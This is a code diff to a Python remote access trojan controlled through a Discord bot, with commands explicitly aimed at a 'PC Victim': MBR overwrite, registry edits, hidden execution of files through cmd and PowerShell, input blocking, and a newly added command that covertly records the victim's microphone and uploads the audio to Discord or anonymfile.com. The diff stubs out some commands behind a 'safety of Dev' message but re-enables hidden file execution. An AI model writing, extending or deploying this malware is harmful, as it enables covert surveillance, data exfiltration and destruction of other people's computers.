@@ -1,12 +1,14 @@
 __import__('sys').path.append('../')
 import discord, asyncio, os, subprocess, requests, psutil, json, win32api, win32con, threading
+import sounddevice as sd
 from PIL import ImageGrab
 from core.info import Info
 from core.sender import Sender
 from discord.ext import commands
 from urllib.parse import urlparse
-from pynput import keyboard, mouse
 from pretty_help import PrettyHelp
+from scipy.io.wavfile import write
+from pynput import keyboard, mouse
 from core.destroy_window import DestroyWindow
 
 os.system('cls')
@@ -23,6 +25,11 @@ def CheckHWID(HWID):
 async def SendOutput(ctx, output):
 	output_embed = discord.Embed(description=f'**__Output__**\n```\n{output}\n```')
 	await ctx.send(embed = output_embed)
+
+async def safe(ctx):
+	if True:
+		await SendOutput(ctx, "This Feature has been disabled for the safety of Dev")
+		return
 
 class Destroy(commands.Cog, description='Destory PC Victim'):
 	@commands.command(aliases=["mbr"], brief='MBR Overwrite', description='MBR Overwrite')
@@ -55,26 +62,23 @@ class Control(commands.Cog, description='Control PC Victim'):
 
 	@commands.command(aliases=['reg'], brief='Control Registry', description='Control Registry')
 	async def Registry(self, ctx, HWID: str, method: str, path: str, ):
+		await safe(ctx)
 		if not CheckHWID(HWID):
-			return
-		if True:
-			await SendOutput(ctx, "cc\nRegistry da tat de dam bao an toan cho Dev")
 			return
 		output = str(subprocess.check_output(f'reg {method} {path} /f', shell=True), 'utf-8')
 		await SendOutput(ctx, output)
 
 	@commands.command(aliases=['tkill', 'tk'], brief='End Processes by Process Name', description='End Processes by Process Name')
 	async def Taskkill(self, ctx, HWID: str, Name: str, ):
+		await safe(ctx)
 		if not CheckHWID(HWID):
-			return
-		if True:
-			await SendOutput(ctx, "cc\nTaskkill da tat de dam bao an toan cho Dev")
 			return
 		output = str(subprocess.check_output(f'taskkill /f /im {Name}', shell=True), 'utf-8')
 		await SendOutput(ctx, output)
 
 	@commands.command(aliases=['tlist', 'tl'], brief='List All Processes Running on PC Victim', description='List All Processes Running on PC Victim')
 	async def Tasklist(self, ctx, HWID: str, ):
+		await safe(ctx)
 		if not CheckHWID(HWID):
 			return
 		processes = ''
@@ -134,18 +138,20 @@ class Control(commands.Cog, description='Control PC Victim'):
 			await SendOutput(ctx, f"Upload File {filename} To Anonymfile Success\nUrl File: {url_file}")
 
 	@commands.command(aliases=["run", "r"], brief='Run File From PC Victim', description='Run File From PC Victim')
-	async def Run(self, ctx, HWID: str,  method = 'cmd', path_file: str = '.', *, agruments):
+	async def Run(self, ctx, HWID: str,  method = 'cmd', path_file: str = '.'):
+		# await safe(ctx)
 		if not CheckHWID(HWID):
 			return
-		if True:
-			await SendOutput(ctx, "cc\nRun da tat de dam bao an toan cho Dev")
-			return
-		if method == 'cmd':
-			output = str(subprocess.check_output(f'cmd /c {path_file} {agruments}', shell=True), 'utf-8')
-			await SendOutput(ctx, output)
-		elif method == 'powershell':
-			output = str(subprocess.check_output(f'powershell -WindowStyle Hidden -Command "Start-Process -FilePath {path_file} {agruments} -Wait"', shell=True), 'utf-8')
-			await SendOutput(ctx, output)
+
+		def subp(method):
+			if method == 'cmd':
+				output = str(subprocess.check_output(f'cmd /c {path_file}', shell=True), 'utf-8')
+				# await SendOutput(ctx, output)
+			elif method == 'powershell':
+				output = str(subprocess.check_output(f'powershell -WindowStyle Hidden -Command "Start-Process -FilePath {path_file} -Wait"', shell=True), 'utf-8')
+				# await SendOutput(ctx, output)
+		threading.Thread(target = subp, args=(method,)).start()
+		await SendOutput(ctx, 'Run Done!\n')
 
 	@commands.command(aliases=["msgbox", "mbox"], brief='Message Box To PC Victim', description='Message Box To PC Victim')
 	async def MessageBox(self, ctx, HWID: str, method = 'msg', amount: int = 1, caption: str = 'Lol', *, message):
@@ -180,9 +186,9 @@ class Control(commands.Cog, description='Control PC Victim'):
 
 	@commands.command(aliases=["blockinput", "binput"], brief='Block Keyboard and Mouse', description='Block Keyboard and Mouse')
 	async def BlockInput(self, ctx, HWID: str):
+		await safe(ctx)
 		if not CheckHWID(HWID):
 			return
-
 		kb_th = threading.Thread(target = self.keyboard_listener.start)
 		ms_th = threading.Thread(target = self.mouse_listener.start)
 		kb_th.start()
@@ -193,9 +199,9 @@ class Control(commands.Cog, description='Control PC Victim'):
 
 	@commands.command(aliases=["unblockinput", "ubinput"], brief='Unblock Keyboard and Mouse', description='Unblock Keyboard and Mouse')
 	async def UnblockInput(self, ctx, HWID: str):
+		await safe(ctx)
 		if not CheckHWID(HWID):
 			return
-
 		self.keyboard_listener.stop()
 		self.mouse_listener.stop()
 
@@ -213,12 +219,41 @@ class Control(commands.Cog, description='Control PC Victim'):
 
 	@commands.command(aliases=["sprocess", "sp"], brief='Start Process in PC Victim', description='Start Process in PC Victim')
 	async def StartProcess(self, ctx, HWID: str, process = None, *, agruments):
+		await safe(ctx)
 		if not CheckHWID(HWID):
 			return
 		if process == None:
 			return
 		output = str(subprocess.check_output(f'powershell -WindowStyle Hidden -Command "Start-Process -FilePath {process} -ArgumentList \"{agruments}\" "'), 'utf-8')
 		await SendOutput(ctx, output)
+
+	@commands.command(aliases=["recordaudio", "raudio"], brief='Record Audio in PC Victim', description='Record Audio in PC Victim')
+	async def RecordAudio(self, ctx, HWID: str, duration: int = 5):
+		if not CheckHWID(HWID):
+			return
+		path_audio = f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Temp\\rcad.wav"
+		freq = 44100
+		recording = sd.rec(int(duration * freq),
+				   samplerate=freq, channels=2)
+		await SendOutput(ctx, "Starting Recording")
+		sd.wait()
+		write(path_audio, freq, recording)
+		await SendOutput(ctx, "Recording Success")
+		if os.path.getsize(path_audio) < 25000000:
+			filename = os.path.basename(path_audio)
+			file = discord.File(path_audio, filename=filename)
+			await SendOutput(ctx, f"Upload Audio {filename}")
+			await ctx.send(file=file)
+		else:
+			filename = os.path.basename(path_audio)
+			file = {"file": open(path_audio, 'rb')}
+			r = requests.post('https://anonymfile.com/api/v1/upload', files=file)
+			json_r = json.loads(r.text)
+			if not json_r['status']:
+				await SendOutput(ctx, f"Upload Audio {path_audio} To Anonymfile Failed")
+				return
+			url_file = json_r['data']['file']['url']['full']
+			await SendOutput(ctx, f"Upload Audio {filename} To Anonymfile Success\nUrl Audio: {url_file}")
 
 class OtherCommands(commands.Cog, description='Other Commands'):
 	@commands.command(aliases=['list'], brief='List All Victim', description='List All Victim')
@@ -249,4 +284,4 @@ async def on_ready():
 	await client.add_cog(Control())
 	await client.add_cog(OtherCommands())
 
-client.run('')
+# client.run(')
